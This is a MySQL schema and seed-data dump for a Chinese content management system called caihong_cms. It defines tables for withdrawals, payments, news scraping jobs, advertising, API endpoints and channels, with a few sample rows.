/*
Navicat MySQL Data Transfer

Source Server         : localhost
Source Server Version : 50717
Source Host           : localhost:3306
Source Database       : caihong_cms

Target Server Type    : MYSQL
Target Server Version : 50717
File Encoding         : 65001

Date: 2017-02-05 16:40:47
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for jc_account_draw
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_draw`;
CREATE TABLE `jc_account_draw` (
  `account_draw_id` int(11) NOT NULL AUTO_INCREMENT,
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现申请者',
  `apply_account` varchar(100) DEFAULT '' COMMENT '申请账户（微信号或支付宝账户）',
  `apply_amount` double NOT NULL DEFAULT '0' COMMENT '提现申请金额',
  `apply_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '处理状态(0申请中 1申请成功待支付 2申请失败 3提现成功)',
  `account_pay_id` int(11) DEFAULT NULL COMMENT '申请成功后支付ID',
  `apply_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '申请时间',
  PRIMARY KEY (`account_draw_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现申请';

-- ----------------------------
-- Records of jc_account_draw
-- ----------------------------

-- ----------------------------
-- Table structure for jc_account_pay
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_pay`;
CREATE TABLE `jc_account_pay` (
  `account_pay_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `draw_num` varchar(50) NOT NULL DEFAULT '' COMMENT '内部流水号',
  `pay_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '支付者',
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现者',
  `pay_account` varchar(100) NOT NULL DEFAULT '' COMMENT '支出账户',
  `draw_account` varchar(100) NOT NULL DEFAULT '' COMMENT '收入账户(微信账户名)',
  `pay_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '支付时间',
  `weixin_num` varchar(100) DEFAULT NULL COMMENT '微信流水号',
  `alipay_num` varchar(100) DEFAULT NULL COMMENT '支付宝流水号',
  PRIMARY KEY (`account_pay_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现支付';

-- ----------------------------
-- Records of jc_account_pay
-- ----------------------------

-- ----------------------------
-- Table structure for jc_acquisition
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition`;
CREATE TABLE `jc_acquisition` (
  `acquisition_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  `type_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `acq_name` varchar(50) NOT NULL COMMENT '采集名称',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '停止时间',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '当前状态(0:静止;1:采集;2:暂停)',
  `curr_num` int(11) NOT NULL DEFAULT '0' COMMENT '当前号码',
  `curr_item` int(11) NOT NULL DEFAULT '0' COMMENT '当前条数',
  `total_item` int(11) NOT NULL DEFAULT '0' COMMENT '每页总条数',
  `pause_time` int(11) NOT NULL DEFAULT '0' COMMENT '暂停时间(毫秒)',
  `page_encoding` varchar(20) NOT NULL DEFAULT 'GBK' COMMENT '页面编码',
  `plan_list` longtext COMMENT '采集列表',
  `dynamic_addr` varchar(255) DEFAULT NULL COMMENT '动态地址',
  `dynamic_start` int(11) DEFAULT NULL COMMENT '页码开始',
  `dynamic_end` int(11) DEFAULT NULL COMMENT '页码结束',
  `linkset_start` varchar(255) DEFAULT NULL COMMENT '内容链接区开始',
  `linkset_end` varchar(255) DEFAULT NULL COMMENT '内容链接区结束',
  `link_start` varchar(255) DEFAULT NULL COMMENT '内容链接开始',
  `link_end` varchar(255) DEFAULT NULL COMMENT '内容链接结束',
  `title_start` varchar(255) DEFAULT NULL COMMENT '标题开始',
  `title_end` varchar(255) DEFAULT NULL COMMENT '标题结束',
  `keywords_start` varchar(255) DEFAULT NULL COMMENT '关键字开始',
  `keywords_end` varchar(255) DEFAULT NULL COMMENT '关键字结束',
  `description_start` varchar(255) DEFAULT NULL COMMENT '描述开始',
  `description_end` varchar(255) DEFAULT NULL COMMENT '描述结束',
  `content_start` varchar(255) DEFAULT NULL COMMENT '内容开始',
  `content_end` varchar(255) DEFAULT NULL COMMENT '内容结束',
  `pagination_start` varchar(255) DEFAULT NULL COMMENT '内容分页开始',
  `pagination_end` varchar(255) DEFAULT NULL COMMENT '内容分页结束',
  `queue` int(11) NOT NULL DEFAULT '0' COMMENT '队列',
  `repeat_check_type` varchar(20) NOT NULL DEFAULT 'NONE' COMMENT '重复类型',
  `img_acqu` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否采集图片',
  `content_prefix` varchar(255) DEFAULT NULL COMMENT '内容地址补全url',
  `img_prefix` varchar(255) DEFAULT NULL COMMENT '图片地址补全url',
  `view_start` varchar(255) DEFAULT NULL COMMENT '浏览量开始',
  `view_end` varchar(255) DEFAULT NULL COMMENT '浏览量结束',
  `view_id_start` varchar(255) DEFAULT NULL COMMENT 'id前缀',
  `view_id_end` varchar(255) DEFAULT NULL COMMENT 'id后缀',
  `view_link` varchar(255) DEFAULT NULL COMMENT '浏览量动态访问地址',
  `releaseTime_start` varchar(255) DEFAULT NULL COMMENT '发布时间开始',
  `releaseTime_end` varchar(255) DEFAULT NULL COMMENT '发布时间结束',
  `author_start` varchar(255) DEFAULT NULL COMMENT '作者开始',
  `author_end` varchar(255) DEFAULT NULL COMMENT '作者结束',
  `origin_start` varchar(255) DEFAULT NULL COMMENT '来源开始',
  `origin_end` varchar(255) DEFAULT NULL COMMENT '来源结束',
  `releaseTime_format` varchar(255) DEFAULT NULL COMMENT '发布时间格式',
  `origin_appoint` varchar(255) DEFAULT NULL COMMENT '指定来源',
  PRIMARY KEY (`acquisition_id`),
  KEY `fk_jc_acquisition_channel` (`channel_id`),
  KEY `fk_jc_acquisition_contenttype` (`type_id`),
  KEY `fk_jc_acquisition_site` (`site_id`),
  KEY `fk_jc_acquisition_user` (`user_id`),
  CONSTRAINT `fk_jc_acquisition_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_acquisition_contenttype` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_acquisition_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_acquisition_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS采集表';

-- ----------------------------
-- Records of jc_acquisition
-- ----------------------------
INSERT INTO `jc_acquisition` VALUES ('1', '1', '75', '1', '1', '测试采集', '2017-02-01 13:35:59', '2017-02-01 13:36:10', '0', '0', '0', '0', '500', 'UTF-8', 'http://roll.news.sina.com.cn/s/channel.php?ch=01#col=91&spec=&type=&ch=01&k=&offset_page=0&offset_num=0&num=60&asc=&page=3', '', '2', '10', '<div class=\"d_list_txt\" id=\"d_list\">', '<div class=\"pagebox\">', '<span class=\"c_tit\"><a href=\"', '\" target=\"_blank\">', '<meta property=\"og:title\" content=\"', '\" />', null, null, '', '', '<div class=\"article article_16\" id=\"artibody\">', '<p class=\"article-editor\">', null, null, '0', 'NONE', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', 'yyyy-MM-dd HH:mm:ss', '');

-- ----------------------------
-- Table structure for jc_acquisition_history
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_history`;
CREATE TABLE `jc_acquisition_history` (
  `history_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `acquisition_id` int(11) DEFAULT NULL COMMENT '采集源',
  `content_id` int(11) DEFAULT NULL COMMENT '内容',
  PRIMARY KEY (`history_id`),
  KEY `fk_acquisition_history_acquisition` (`acquisition_id`),
  CONSTRAINT `fk_jc_history_acquisition` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集历史记录表';

-- ----------------------------
-- Records of jc_acquisition_history
-- ----------------------------

-- ----------------------------
-- Table structure for jc_acquisition_temp
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_temp`;
CREATE TABLE `jc_acquisition_temp` (
  `temp_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `finish_percent` int(3) NOT NULL DEFAULT '0' COMMENT '百分比',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `seq` int(3) NOT NULL DEFAULT '0' COMMENT '顺序',
  PRIMARY KEY (`temp_id`),
  KEY `fk_jc_temp_site` (`site_id`),
  CONSTRAINT `fk_jc_temp_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集进度临时表';

-- ----------------------------
-- Records of jc_acquisition_temp
-- ----------------------------

-- ----------------------------
-- Table structure for jc_advertising
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising`;
CREATE TABLE `jc_advertising` (
  `advertising_id` int(11) NOT NULL AUTO_INCREMENT,
  `adspace_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '广告名称',
  `category` varchar(50) NOT NULL COMMENT '广告类型',
  `ad_code` longtext COMMENT '广告代码',
  `ad_weight` int(11) NOT NULL DEFAULT '1' COMMENT '广告权重',
  `display_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '展现次数',
  `click_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `start_time` date DEFAULT NULL COMMENT '开始时间',
  `end_time` date DEFAULT NULL COMMENT '结束时间',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`advertising_id`),
  KEY `fk_jc_advertising_site` (`site_id`),
  KEY `fk_jc_space_advertising` (`adspace_id`),
  CONSTRAINT `fk_jc_advertising_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_space_advertising` FOREIGN KEY (`adspace_id`) REFERENCES `jc_advertising_space` (`adspace_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告表';

-- ----------------------------
-- Records of jc_advertising
-- ----------------------------
INSERT INTO `jc_advertising` VALUES ('1', '1', '1', 'www.caihongyixue.com', 'text', null, '1', '0', '0', null, null, '1');

-- ----------------------------
-- Table structure for jc_advertising_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_attr`;
CREATE TABLE `jc_advertising_attr` (
  `advertising_id` int(11) NOT NULL,
  `attr_name` varchar(50) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_params_advertising` (`advertising_id`),
  CONSTRAINT `fk_jc_params_advertising` FOREIGN KEY (`advertising_id`) REFERENCES `jc_advertising` (`advertising_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS广告属性表';

-- ----------------------------
-- Records of jc_advertising_attr
-- ----------------------------
INSERT INTO `jc_advertising_attr` VALUES ('1', 'text_title', 'www.caihongyixue.com');
INSERT INTO `jc_advertising_attr` VALUES ('1', 'text_target', '_blank');
INSERT INTO `jc_advertising_attr` VALUES ('1', 'text_link', 'http://www.caihongyixue.com');

-- ----------------------------
-- Table structure for jc_advertising_space
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_space`;
CREATE TABLE `jc_advertising_space` (
  `adspace_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `is_enabled` char(1) NOT NULL COMMENT '是否启用',
  PRIMARY KEY (`adspace_id`),
  KEY `fk_jc_adspace_site` (`site_id`),
  CONSTRAINT `fk_jc_adspace_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告版位表';

-- ----------------------------
-- Records of jc_advertising_space
-- ----------------------------
INSERT INTO `jc_advertising_space` VALUES ('1', '1', '1', '111', '1');

-- ----------------------------
-- Table structure for jc_api_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_account`;
CREATE TABLE `jc_api_account` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) NOT NULL DEFAULT '' COMMENT 'appId',
  `app_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'appKey',
  `aes_key` varchar(100) NOT NULL DEFAULT '' COMMENT 'AES加解密密钥',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `iv_key` varchar(50) NOT NULL DEFAULT '' COMMENT 'AES iv key',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API应用账户';

-- ----------------------------
-- Records of jc_api_account
-- ----------------------------

-- ----------------------------
-- Table structure for jc_api_info
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_info`;
CREATE TABLE `jc_api_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `api_name` varchar(255) NOT NULL DEFAULT '' COMMENT '接口名称',
  `api_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口URL',
  `api_code` varchar(50) NOT NULL DEFAULT '' COMMENT '接口代码',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `limit_call_day` int(11) NOT NULL DEFAULT '0' COMMENT '每日限制调用次数(0无限制)',
  `call_total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总调用次数',
  `call_month_count` int(11) NOT NULL DEFAULT '0' COMMENT '月调用次数',
  `call_week_count` int(11) NOT NULL DEFAULT '0' COMMENT '周调用次数',
  `call_day_count` int(11) NOT NULL DEFAULT '0' COMMENT '日调用次数',
  `last_call_time` timestamp NULL DEFAULT NULL COMMENT '最后一次调用时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=77 DEFAULT CHARSET=utf8 COMMENT='API接口信息';

-- ----------------------------
-- Records of jc_api_info
-- ----------------------------
INSERT INTO `jc_api_info` VALUES ('1', '栏目列表', '/api/channel/list.jspx', '010101', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('2', '单个栏目', '/api/channel/get.jspx', '010102', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('3', '新增栏目', '/api/channel/save.jspx', '010103', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('4', '修改栏目', '/api/channel/update.jspx', '010104', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('5', '内容列表', '/api/content/list.jspx', '010201', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('6', '内容获取', '/api/content/get.jspx', '010202', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('7', '我的内容', '/api/content/mycontents.jspx', '010203', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('8', '新增内容', '/api/content/save.jspx', '010204', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('9', '修改内容', '/api/content/update.jspx', '010205', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('10', '删除内容到回收站', '/api/content/del.jspx', '010206', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('11', '还原内容', '/api/content/recycle.jspx', '010207', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('12', '审核内容', '/api/content/check.jspx', '010208', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('13', '退回内容', '/api/content/reject.jspx', '010209', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('14', '顶内容', '/api/content/up.jspx', '010210', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('15', '踩内容', '/api/content/down.jspx', '010211', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('16', '内容购买', '/api/content/buy.jspx', '010212', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('17', '内容打赏', '/api/content/reward.jspx', '010213', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('18', '内容收藏', '/api/content/collect.jspx', '010301', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('19', '我的收藏', '/api/content/mycollect.jspx', '010302', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('20', '专题列表', '/api/topic/list.jspx', '010401', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('21', '专题获取', '/api/topic/get.jspx', '010402', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('22', '专题保存', '/api/topic/save.jspx', '010403', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('23', '专题修改', '/api/topic/update.jspx', '040404', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('24', '全文检索', '/api/content/search.jspx', '010501', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('25', 'Tag列表', '/api/contenttag/list.jspx', '010601', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('26', '热词列表', '/api/searchword/list.jspx', '010701', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('27', '友情链接列表', '/api/friendlink/list.jspx', '010801', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('28', '友情链接分类列表', '/api/friendlinkctg/list.jspx', '010802', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('29', '广告列表', '/api/ad/list.jspx', '010901', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('30', '广告分类列表', '/api/adctg/list.jspx', '010902', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('31', '单广告获取', '/api/ad/get.jspx', '010903', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('32', '评论列表', '/api/comment/list.jspx', '011001', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('33', '单评论获取', '/api/comment/get.jspx', '011002', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('34', '发布评论', '/api/comment/save.jspx', '011003', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('35', '评论顶', '/comment_up.jspx', '011004', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('36', '评论踩', '/comment_down.jspx', '011005', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('37', '我的评论', '/api/comment/mylist.jspx', '011006', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('38', '留言列表', '/api/guestbook/list.jspx', '011101', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('39', '我的留言', '/api/guestbook/mylist.jspx', '011102', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('40', '留言分类列表', '/api/guestbookctg/list.jspx', '011103', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('41', '单留言获取', '/api/guestbook/get.jspx', '011104', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('42', '发布留言', '/api/guestbook/save.jspx', '011105', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('43', '投票列表', '/api/vote/list.jspx', '011201', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('44', '单个投票', '/api/vote/get.jspx', '011202', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('45', '投票', '/api/vote/save.jspx', '011203', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('46', '新增会员', '/api/user/add.jspx', '011301', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('47', '会员修改资料', '/api/user/edit.jspx', '011302', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('48', '用户修改密码', '/api/user/pwd.jspx', '011303', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('49', '读取用户信息', '/api/user/get.jspx', '011304', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('50', '用户名唯一性检查', '/username_unique.jspx', '011305', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('51', '字典列表', '/api/dictionary/list.jspx', '011401', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('52', '我的职位申请', '/api/resume/myapplys.jspx', '011501', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('53', '申请职位', '/api/resume/apply.jspx', '011502', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('54', '撤销申请', '/api/resume/cancelApply.jspx', '011503', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('55', '查看我的简历', '/api/resume/get.jspx', '011601', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('56', '修改简历', '/api/resume/update.jspx', '011602', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('57', '站内信列表', '/api/message/list.jspx', '011701', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('58', '站内信单信息获取', '/api/message/get.jspx', '011702', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('59', '站内信息发送', '/api/message/send.jspx', '011703', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('60', '站内信草稿修改', '/api/message/draftUpdate.jspx', '011703', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('61', '站内信草稿发送', '/api/message/draftToSend.jspx', '011704', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('62', '删除站内信到回收站', '/api/message/trash.jspx', '011705', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('63', '还原站内信息', '/api/message/revert.jspx', '011706', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('64', '删除站内信', '/api/message/delete.jspx', '011707', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('65', '上传文件', '/api/upload/o_upload.jspx', '011801', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('66', '上传文库文档', '/api/upload/o_upload_doc.jspx', '011802', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('67', '内容打赏记录', '/api/order/getByContent.jspx', '011901', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('68', '我的消费记录和我的订单', '/api/order/myorders.jspx', '011902', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('69', '收益统计', '/api/order/chargelist.jspx', '011903', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('70', '提现申请', '/api/draw/apply.jspx', '011904', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('71', '删除提现申请', '/api/draw/delete.jspx', '011905', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('72', '提现申请列表', '/api/draw/list.jspx', '011906', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('73', '个人账户信息获取', '/api/account/get.jspx', '011907', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('74', '登陆', '/api/user/login.jspx', '012001', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('75', '退出', '/api/user/logout.jspx', '012002', '0', '0', '0', '0', '0', '0', null);
INSERT INTO `jc_api_info` VALUES ('76', '用户状态检查', '/api/user/getStatus.jspx', '012003', '0', '0', '0', '0', '0', '0', null);

-- ----------------------------
-- Table structure for jc_api_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_record`;
CREATE TABLE `jc_api_record` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `api_account` int(11) NOT NULL DEFAULT '0' COMMENT '调用的账户',
  `call_ip` varchar(255) DEFAULT '' COMMENT '调用的IP',
  `api_info_id` int(11) DEFAULT '0' COMMENT '接口',
  `api_call_time` datetime NOT NULL COMMENT '调用时间',
  `call_time_stamp` bigint(20) NOT NULL DEFAULT '0' COMMENT '调用的时间戳',
  `sign` varchar(100) NOT NULL DEFAULT '' COMMENT '签名数据(不允许重复调用)',
  PRIMARY KEY (`id`),
  KEY `fk_api_record_account` (`api_account`),
  KEY `fk_api_info` (`api_info_id`),
  KEY `index_jc_api_record_sign` (`sign`),
  CONSTRAINT `fk_api_info` FOREIGN KEY (`api_info_id`) REFERENCES `jc_api_info` (`id`),
  CONSTRAINT `fk_api_record_account` FOREIGN KEY (`api_account`) REFERENCES `jc_api_account` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API调用记录';

-- ----------------------------
-- Records of jc_api_record
-- ----------------------------

-- ----------------------------
-- Table structure for jc_api_user_login
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_user_login`;
CREATE TABLE `jc_api_user_login` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `session_key` varchar(100) DEFAULT '' COMMENT 'sesssionKey',
  `username` varchar(255) NOT NULL DEFAULT '' COMMENT '用户名',
  `login_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '登陆时间',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登陆次数',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API用户登录表';

-- ----------------------------
-- Records of jc_api_user_login
-- ----------------------------

-- ----------------------------
-- Table structure for jc_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel`;
CREATE TABLE `jc_channel` (
  `channel_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `parent_id` int(11) DEFAULT NULL COMMENT '父栏目ID',
  `channel_path` varchar(30) DEFAULT NULL COMMENT '访问路径',
  `lft` int(11) NOT NULL DEFAULT '1' COMMENT '树左边',
  `rgt` int(11) NOT NULL DEFAULT '2' COMMENT '树右边',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `workflow_id` int(11) DEFAULT NULL COMMENT '工作流id',
  PRIMARY KEY (`channel_id`),
  KEY `fk_jc_channel_model` (`model_id`),
  KEY `fk_jc_channel_parent` (`parent_id`),
  KEY `fk_jc_channel_site` (`site_id`),
  KEY `index_jc_channel_lft` (`lft`),
  KEY `index_jc_channel_rgt` (`rgt`),
  CONSTRAINT `fk_jc_channel_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_channel_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_channel_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=97 DEFAULT CHARSET=utf8 COMMENT='CMS栏目表';

-- ----------------------------
-- Records of jc_channel
-- ----------------------------
INSERT INTO `jc_channel` VALUES ('75', '1', '1', null, 'news', '1', '8', '4', '1', '1', null);
INSERT INTO `jc_channel` VALUES ('76', '5', '1', null, 'zjtd', '9', '10', '2', '1', '1', null);
INSERT INTO `jc_channel` VALUES ('77', '6', '1', null, 'education', '11', '12', '1', '1', '1', null);
INSERT INTO `jc_channel` VALUES ('78', '1', '1', null, 'yyhz', '13', '14', '3', '1', '1', null);
INSERT INTO `jc_channel` VALUES ('81', '2', '1', null, 'gywm', '15', '16', '5', '0', '1', null);
INSERT INTO `jc_channel` VALUES ('82', '2', '1', null, 'message', '17', '18', '6', '0', '1', null);
INSERT INTO `jc_channel` VALUES ('94', '1', '1', '75', 'docbbs', '2', '3', '2', '1', '1', null);
